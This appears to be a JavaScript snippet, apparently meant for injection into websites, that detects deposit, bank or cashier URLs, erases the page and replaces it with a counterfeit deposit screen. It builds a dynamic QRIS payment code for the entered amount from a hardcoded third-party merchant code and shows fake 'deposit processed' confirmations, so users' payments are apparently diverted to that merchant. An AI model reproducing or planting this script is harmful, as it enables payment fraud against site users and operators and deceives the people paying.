(function () {
  const url = window.location.href;
  const match = [
    '/deposit', '/bank', '/deposit.php', '/qris.php', '/cashier',
    '/?page=transaksi', '/index.php?page=transaksi', '/?deposit&head=home',
    '/index.php?page=cashier', '/bank.php'
  ];
  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `...CSS sama persis seperti sebelumnya...`;

  document.body.innerHTML = `...HTML sama persis seperti sebelumnya...`;

  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove("show"), 2500);
  }

  window.showDeposit = function (type) {
    document.getElementById("manual-step").style.display = type === "manual" ? "block" : "none";
    document.getElementById("auto-deposit").style.display = type === "auto" ? "block" : "none";
  };

  window.selectMethod = function (j) {
    if (!j) return;
    const m = JSON.parse(j);
    document.getElementById("manual-details").style.display = "flex";
    document.getElementById("bank-logo").src = m.logo;
    document.getElementById("bank-name").innerText = m.name;
    document.getElementById("bank-number").innerText = m.number;
    document.getElementById("bank-owner").innerText = "a/n " + m.owner;
  };

  window.copyNumber = function () {
    const num = document.getElementById("bank-number").innerText;
    if (!num) return showToast("Nomor kosong!", "error");
    navigator.clipboard.writeText(num).then(() => showToast("Nomor rekening disalin", "success"));
  };

  window.submitManualDeposit = function () {
    const n = Number(document.getElementById("manual-nominal").value || 0);
    if (n < 50000) return showToast("Minimal deposit 50.000", "error");
    document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
    setTimeout(() => {
      document.getElementById("manual-result").innerHTML = "<strong>Deposit Diproses...</strong>";
      setTimeout(() => history.back(), 1500);
    }, 1500);
  };

  // ==== QRIS Dynamic Functions ====
  function crc16_ccitt_false_hex(inputStr) {
    const bytes = [];
    for (let i = 0; i < inputStr.length; i++) bytes.push(inputStr.charCodeAt(i));
    let crc = 0xFFFF;
    for (let b of bytes) {
      crc ^= (b << 8);
      for (let i = 0; i < 8; i++) {
        if ((crc & 0x8000) !== 0) crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
        else crc = (crc << 1) & 0xFFFF;
      }
    }
    let hex = crc.toString(16).toUpperCase();
    while (hex.length < 4) hex = '0' + hex;
    return hex;
  }

  function buildAmountTag(amountStr) {
    const digits = (''+amountStr).replace(/[^0-9]/g, '');
    if (!digits) return '';
    const len = digits.length.toString().padStart(2, '0');
    return '54' + len + digits;
  }

  function stripOldCRC(str) {
    const idx = str.indexOf('6304');
    if (idx !== -1 && idx + 8 <= str.length) return str.substring(0, idx);
    return str;
  }

  function convertStaticToDynamic(staticQris, amount) {
    let cleaned = stripOldCRC(staticQris);
    cleaned = cleaned.replace('010211', '010212');
    let idx = cleaned.indexOf('5802ID');
    if (idx === -1) idx = cleaned.indexOf('5802');
    if (idx === -1) idx = cleaned.indexOf('6304');
    let before = cleaned, after = '';
    if (idx !== -1) {
      before = cleaned.substring(0, idx);
      after = cleaned.substring(idx);
    }
    const amountTag = buildAmountTag(amount);
    let combined = before + amountTag + after;
    combined = stripOldCRC(combined);
    const crcPayload = combined + '6304';
    return crcPayload + crc16_ccitt_false_hex(crcPayload);
  }

  const QRIS_STATIC = "00020101021126670016COM.NOBUBANK.WWW01189360050300000879140214250910000000730303UMI51440014ID.CO.QRIS.WWW0215ID20254343011770303UMI5204481253033605802ID5920ARPUS CELL OK26161126007LANGKAT61052076162070703A016304C2AD";

  // ==== Generate QRIS Button ====
  window.generateQRIS = function () {
    const n = Number(document.getElementById("nominal").value || 0);
    if (n < 50000) return showToast("Minimal 50.000", "error");
    document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';

    const dynamicQris = convertStaticToDynamic(QRIS_STATIC, n);
    const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + encodeURIComponent(dynamicQris);

    document.getElementById("auto-result").innerHTML = `
      <div class="qr-card">
        <img id="qris-img" src="${qrUrl}" alt="QRIS">
      </div>
      <div class="qr-buttons">
        <button class="download-btn" onclick="downloadQRIS('${qrUrl}')">Download QRIS</button>
        <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
      </div>
    `;
  };

  window.downloadQRIS = function (qrUrl) {
    const link = document.createElement("a");
    link.href = qrUrl;
    link.download = "qris.png";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("QRIS berhasil diunduh", "success");
  };
})();
